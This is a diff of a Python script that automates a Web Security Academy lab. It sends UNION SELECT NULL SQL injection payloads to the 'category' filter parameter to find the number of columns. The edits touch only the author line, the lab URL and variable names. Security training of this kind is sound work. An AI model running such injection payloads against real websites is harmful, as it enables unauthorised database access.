@@ -1,6 +1,6 @@
 #########################################################################################
 #
-# Author: Ahmed Elqalawii
+# Author: Ahmed Elqalawy (@elqal3awii)
 #
 # Date: 16/9/2023
 #
@@ -26,7 +26,7 @@ import re
 # Main
 #########
 # change this url to your lab
-url = "https://0a7c00b003c091988041c121006a00b7.web-security-academy.net"
+url = "https://0ac90018045e57a7845755d0006d000e.web-security-academy.net"
 print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
 for i in range(1, 10):
     try:
@@ -36,13 +36,13 @@ for i in range(1, 10):
         payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -") # remove the last comma
         print(Fore.WHITE + f"[*] Trying payload: {payload}")
         # fetch the page with the injected payload
-        null_injection = requests.get(
+        injection = requests.get(
             f"{url}/filter?category={payload}")
         # extract the error text
-        internal_error = re.findall("<h4>Internal Server Error</h4>",
-                                    null_injection.text)
+        internal_error_text = re.findall("<h4>Internal Server Error</h4>",
+                                    injection.text)
         # if the response is successful with no error text
-        if len(internal_error) == 0:
+        if len(internal_error_text) == 0:
             print(Fore.WHITE + "[#] Number of columns: " + Fore.GREEN + str(i))
             print(
                 Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
